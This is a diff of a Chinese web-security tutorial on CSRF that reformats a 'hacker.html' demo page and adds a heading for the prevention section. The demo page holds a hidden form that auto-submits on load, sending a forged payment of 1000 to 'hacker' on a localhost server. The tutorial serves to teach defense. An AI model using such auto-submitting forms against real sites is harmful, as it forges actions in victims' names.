@@ -121,19 +121,13 @@ app.listen(port, () => {
 ::: tab hacker.html
 
 ```html
-<form
-  method="POST"
-  action="http://localhost:3000/pay"
-  target="csrf-frame"
-  id="csrf-form"
-  style="display:none"
->
+<form method="POST" action="http://localhost:3000/pay" target="csrf-frame" id="csrf-form" style="display:none">
   <input name="target" value="hacker" />
   <input name="money" value="1000" />
   <input type="submit" value=" submit " />
 </form>
 <script>
-  window.onload = function() {
+  window.onload = function () {
     document.getElementById('csrf-form').submit();
   };
 </script>
@@ -218,6 +212,8 @@ app.listen(port, () => {
 ::::
 
 黑客又构建了一个隐藏的表单，当我们访问这个网站的时候呢，他就将这个表单给提交了这样的话呢，也可以造成一次 CSRF 攻击。
+
+## 怎么去预防
 
 预防
 
